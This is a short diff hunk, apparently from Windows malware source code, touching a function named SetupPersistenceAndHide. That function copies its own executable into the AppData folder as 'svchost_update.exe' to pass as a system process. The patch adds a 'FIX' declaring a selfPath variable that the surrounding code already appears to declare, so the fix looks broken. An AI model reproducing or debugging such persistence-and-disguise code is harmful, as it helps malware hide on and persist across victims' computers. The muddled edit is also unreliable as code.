@@ -586,6 +586,10 @@ void SetupPersistenceAndHide() {
     if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
         std::string destPath = std::string(appdata) + "\\Microsoft\\svchost_update.exe";
         
+// 🔧 FIX: Declare selfPath variable (was missing)
+     char selfPath[MAX_PATH];  // < This line was missing
+        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+        
         // Copy self to AppData if not already there        char selfPath[MAX_PATH];
         GetModuleFileNameA(NULL, selfPath, MAX_PATH);
         if (strcmp(selfPath, destPath.c_str()) != 0) {
